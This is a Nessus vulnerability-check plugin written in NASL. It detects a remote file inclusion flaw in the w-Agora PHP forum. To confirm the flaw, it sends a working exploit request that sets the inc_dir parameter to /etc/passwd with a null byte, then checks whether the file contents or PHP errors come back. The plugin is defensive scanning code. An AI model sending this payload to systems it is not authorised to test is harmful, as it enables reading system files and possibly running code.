#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(21739);
  script_version("1.19");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(18601);

  script_name(english:"w-Agora inc_dir Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote file include attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running w-Agora, a web-based forum software written
in PHP. 

The version of w-Agora installed on the remote host fails to sanitize
input to the 'inc_dir' parameter before using it in several scripts to
include PHP code.  Provided PHP's 'register_globals' setting is
disabled, an unauthenticated attacker may be able to exploit this flaw
to view arbitrary files on the remote host or to execute arbitrary PHP
code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/438237");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/06/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/06/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0, php: 1);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/agora", "/w-agora", "/forum", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it's w-Agora...
  if (
    '<meta name="GENERATOR" Content="w-agora' >< res ||
    ">agora sites" >< res
  )
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd%00";
    r = http_send_recv3(method:"GET",
      item:string(
        dir, "/index.php?",
        "inc_dir=", file
      ), 
      exit_on_fail: 1, 
      port:port
    );
    res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0/misc_func.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (contents)
      {
        contents = data_protection::redact_etc_passwd(output:contents);
        report = string(
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
